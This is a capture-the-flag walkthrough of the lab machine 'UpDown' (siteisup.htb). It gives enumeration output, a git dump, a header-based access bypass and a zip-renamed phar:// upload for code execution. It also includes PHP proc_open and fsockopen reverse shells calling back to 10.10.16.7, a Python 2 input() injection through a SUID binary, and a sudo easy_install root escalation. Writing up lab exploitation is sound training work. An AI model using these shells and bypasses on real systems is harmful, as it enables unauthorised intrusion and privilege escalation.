#box #vhost #git #git-dumper #HTTP-Headers-Custom #file-upload #phar #zipupload #ghidra #python-builtin-functions #sudo-capabilities #easy_install
# Nmap

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 12:35 EDT
Nmap scan report for siteisup.htb (10.10.11.177)
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
```

## 80 - HTTP

On port 80 we discover a website that permits you to prompt an URL and check whether this IP is up or down. We set up a `nc` listener and insert our IP and port, banner grabbing the DNS:

![[attachments/updown-writeup-1.png]]

We promptly update our `/etc/hosts` file with the discovered DNS.
After different tries at obtaining a command injection we've noticed that any escape we knew weren't enough to bypass the blacklist set on the backend. We thus start enumerating for VHosts / Subdomains and directories.
The Subdomain fuzzing doesn't return anything important while the other two scans provide us some key information to proceed with the pentest:

### VHosts Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://siteisup.htb/ -H 'Host: FUZZ.siteisup.htb' -c -ic -fs 1131

dev                     [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4928ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1324 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

### Directory Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://dev.siteisup.htb/FUZZ -c -ic

dev/                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 38ms]
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://siteisup.htb/dev/FUZZ -c -ic -fc 403

.git                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 39ms]
.git/config             [Status: 200, Size: 298, Words: 23, Lines: 14, Duration: 46ms]
.git/                   [Status: 200, Size: 2884, Words: 191, Lines: 27, Duration: 46ms]
.git/logs/refs          [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 24ms]
.git/logs/HEAD          [Status: 200, Size: 179, Words: 8, Lines: 2, Duration: 24ms]
.git/HEAD               [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 42ms]
.git/logs/              [Status: 200, Size: 1143, Words: 77, Lines: 18, Duration: 42ms]
.git/index              [Status: 200, Size: 521, Words: 4, Lines: 3, Duration: 63ms]
```

Discovering the presence of a <span style="background:#fff88f">.git</span> folder.

---

We opt to download [git-dumper](https://github.com/arthaud/git-dumper) to download the content of the git folder with ease.
Once downloaded, we dump the content of the given folder:

```bash
./git_dumper.py http://siteisup.htb/dev/.git ./dump
```

 Obtaining a variety of files contained in this git repository. Most importantly, we notice the presence of an `admin.php` file which seems pretty much empty, a `checker.php` file, which contains all the blocking logic of the website input and a `.htaccess` file.
 The `.htaccess` file contains the following content:

```bash
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

Basically it specifies the possibility to add a custom header called `Special-Dev` with a special value called `only4dev`. This header is what allows an user accessing the website to effectively be allowed to access it. We can confirm that because the rule is:
* Deny from All
* Allow from env=Required-Header (which translates to allow from `Special-Dev: only4dev`)

This `.htaccess` file has been found inside the `/dev` folder of our initial target.
We've also found the presence of a virtual host called `dev`. What happens if we add `dev.siteisup.htb` to our `/etc/hosts` file and try to reach the website?

![[attachments/updown-writeup-2.png]]

At this point, what happens if we add the custom header found above to our request?
We can do that with BurpSuite by going in `Proxy->Match and replace->Add`.
Here we have the chance to add a new header or replace an existing one to every request when the rule is active.
In this case, we just need to add a new header, so what we can do is choose the type `Request Header`, add that header in the `Replace` option and click on Ok.

![[attachments/updown-writeup-3.png]]

Once done, our rule will be added to the list. By enabling them and attaching FoxyProxy to our BurpSuite proxy we'll be able to request that page with this custom header set:

![[attachments/updown-writeup-4.png]]

Finally accessing the website.

## Reverse Shell

To obtain a reverse shell, there are a few points to put in order. This virtual host is slightly different from the previous one, here we can apparently load a file, however what we know is that the `checker.php` file sets up some blacklisting to prevent RCE.

First, it checks for filesize. So we won't be able to put a shell which is too big into it.

```php
if ($_FILES['file']['size'] > 10000) {
	die("File too large!");
}
```

Then, it checks for file extensions. Preventing pretty much all the extensions, apparently. Except for `phar` though.

```bash
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
	die("Extension not allowed!");
}
```

When the file is uploaded, it put it inside a folder called `/uploads/` and a conversion to md5 of the actual timestamp:

```bash
$dir = "uploads/".md5(time())."/";
if(!is_dir($dir)){
	mkdir($dir, 0770, true);
}
```

Then apparently some checks are made when trying to input the file content with the PHP wrappers `file://`, `data://` and `ftp://`

```bash
$websites = explode("\n",file_get_contents($final_path));

foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
				$check=isitup($site);
				if($check){
						echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
				}else{
						echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
				}
		}else{
				echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
}
```

Now, a solution could be de facto to abuse the `phar` (PHP Archive) file to effectively upload the phar file and gain RCE within this vector. However, zip files are unallowed. What happens if we zip the file and simply name it with a different extension?
## Zipping files with a different extension

To make a quick and test of RCE, we can use a basic PHP script `<?php phpinfo(); ?>`. 
We zip it `zip shell.abc shell.php` (we put the `shell.php` file containing `phpinfo()` into a zip file called `shell.abc`), and we then uploaded it on the website.

Initially the website will prompt us an error "seems to be down :(". However, by navigating to the uploads folder, we notice that a folder has been effectively created and our zip file is contained there:

![[attachments/updown-writeup-5.png]]

![[attachments/updown-writeup-6.png]]

We can now try to access the phar file by navigating to the following endpoint, within the `phar://` PHP wrapper:

```url
http://dev.siteisup.htb/?page=phar://uploads/15f1453dfdbfe7f579c2ecd5a5f2667f/shell.abc/shell
```

We got it! We got RCE on the target server. Now we just need to get a shell. On the endpoint above, within the `phpinfo()` we notice that there are plenty of disabled function:

![[attachments/updown-writeup-7.png]]

Within those we notice the usual ones required to get a shell:
* system
* exec
* shell_exec
* popen
* passthru
* fsockopen

What's noticeable, at first, is that `proc_open` is not in this list. We might be able to get a shell by abusing this PHP function.

### Adjusting proc_open shell and making it executable

When we talk about a `proc_open` we usually refer to this shell:

```bash
php -r '$sock=fsockopen("10.10.16.7",4445);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

However, this shell assumes that it's being ran in bash. We need to transform this shell into a PHP file.

```php
<?php $proc=proc_open("bash -c 'bash -i >& /dev/tcp/10.10.16.7/4444 0>&1'", array(0=>array("pipe","r"), 1=>array("pipe","w"), 2=>array("pipe", "w")),$pipes); ?>
```

The substantial transformation between the bash shell and this shell, is the `$sock` variable. In the bash shell the `fsockopen` function is responsible to create the socket connection with a given URL / port. This part is missing from our transformed php shell because `fsockopen` is blocked by the <span style="background:#fff88f">disable_functions</span> from `phpinfo`. To transform `fsockopen` into a working shell, we create an array of arrays that redirects the I/O operation to our end.
In this way:
* `0=>array("pipe","r")`, 0 => will read the input we type
* `1=>array("pipe","w")`, 1 => will write the output the target shell gives us
* `2=>array("pipe", "w")`, 2 => will write the errors the target shell gives us

 Basically, we've rewritten `fsockopen`.
 At this point, we zip again the shell, upload the zip and reach the right phar archive (with a `nc` session opened on port `4444`):
 
```bash
http://dev.siteisup.htb/uploads/d99bae6ef52d8018704c8951efcf709a/new.abc/test
```

Obtaining a shell:

![[attachments/updown-writeup-8.png]]

## Lateral Movement to `developer`

We gain a shell with `www-data`, however we quickly notice that we can access `/home` and further more `/developer` which is another user of the machine (`cat /etc/passwd | grep bash`).
Inside `/home/developer` we discover the presence of  a `/dev` folder. Inside of it we can find a binary called `siteisup` and a python file called `siteisup_test.py`. We're assuming the binary calls the python file, but to confirm it we transfer the file on our machine.

>We couldn't achieve a ftp connection to our machine, so we abused the presence of an active webserver to properly transfer the binary. We copied that binary onto `/var/www/html` (the website reachable without the custom header, just for ease) and we then used `curl http://siteisup.htb/siteisup -O siteisup` to get the executable on our end.
### Analyzing the executable with `ghidra`

We open `ghidra`, we create a new project and we then import the binary. We'll be prompted to analyze the file and we confirm that. 
Once opened we'll automatically be moved to the main function that confirms our thesis. The binary recalls this test script in python:

![[attachments/updown-writeup-9.png]]

Both the paths are absolute, so we cannot opt for path hijacking.

---

We notice that the binary `siteisup` has a SUID set:

This means that once executed, this binary will be ran as the owner of it, which is `developer`.

We also notice that the python file seems to be written in python2 because the print function is specified with a space instead of the parenthesis. Python2 suffers a vulnerability that uses the `eval()` function in the `input()` function to evaluate the content written during the input phase. This means that we can prompt a snippet of code and obtain a response directly from the [input function](https://www.geeksforgeeks.org/python/vulnerability-input-function-python-2-x/#:~:text=required%20in%20raw_input()-,Vulnerability%20in%20input()%20Method,-The%20vulnerability%20in).

This means that we can use Python's magic object to import the `os` library and execute a command of our choice such as:

```python
__import__('os').system('id')
```

And the binary will prompt us the command execution's result:

Confirming that, we can obtain a shell as `developer` by simply changing the command from `id` to `bash`:

```python
__import__('os').system('bash')
```

![[attachments/updown-writeup-10.png]]

## Privilege Escalation

The privilege escalation path is actually quite simple.
In fact the first thing that we do is running `sudo -l` discovering that this user can run a binary called `easy_install`. This binary has a [GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/#sudo) that permits to escalate privileges if we have the privileges to run it as sudo. Thus, we follow the instruction on the GTFOBins, obtaining the root of the machine:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/bash', 'bash', '-c', 'bash <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```

![[attachments/updown-writeup-11.png]]